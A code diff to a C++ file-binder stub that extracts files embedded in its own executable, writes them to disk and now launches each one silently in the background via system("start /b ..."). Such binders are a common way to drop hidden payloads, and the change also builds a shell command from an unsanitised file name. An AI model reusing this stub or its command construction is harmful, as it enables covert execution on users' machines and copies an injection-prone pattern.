@@ -36,10 +36,11 @@ bool Stub::isSetFileName() {
 bool Stub::extractAndExecute() {
 	if (isSetFileName()) {
 		char *buffer = nullptr;
+		char *currentFileName = nullptr;
+		char *command = nullptr;
 		std::vector<char*> fileNameList;
 		unsigned long recordPosition = 0;
 		unsigned long size = 0;
-		char *currentFileName = nullptr;
 		unsigned long currentFilePosition = 0;
 		unsigned long currentFileSize = 0;
 		FILE *currentFile = nullptr;
@@ -58,15 +59,22 @@ bool Stub::extractAndExecute() {
 		recordPosition = readRecordPosition(buffer, size);
 		// Now read all records.
 		readRecord(buffer, recordPosition);
-		
+
 		// Create all binded files and execute it.
 		while (!nameRecord.empty()) {
 			currentFileName = nameRecord.back();
 			currentFilePosition = positionRecord.back();
 			currentFileSize = sizeRecord.back();
-			
+
 			if (createFile(currentFileName, buffer + currentFilePosition, currentFileSize)) {
-				ShellExecute(NULL, "open", currentFileName, NULL, NULL, 1);
+				command = new char[strlen(currentFileName) + 10];
+				strcpy(command, "start /b ");
+				strcat(command, currentFileName);
+				strcat(command, "\0");
+				system(command);
+			}
+			else {
+				std::cout << currentFileName << " could not be created." << std::endl;
 			}
 
 			nameRecord.pop_back();
